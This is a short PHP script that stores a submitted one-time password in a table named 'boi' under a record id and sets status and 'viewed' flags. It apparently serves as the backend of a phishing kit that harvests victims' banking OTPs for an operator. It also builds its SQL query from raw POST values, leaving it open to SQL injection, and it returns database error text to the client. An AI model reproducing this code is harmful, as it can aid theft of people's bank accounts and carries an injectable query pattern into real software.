<?php
require '../connection.php';

if ($_POST["otp"] and $_POST["uniqueid"]) {
  $otp = $_POST["otp"];
  $uniqueid = $_POST["uniqueid"];

  $send_response = mysqli_query($conn, "UPDATE boi SET otp='$otp', status = 0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($send_response) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
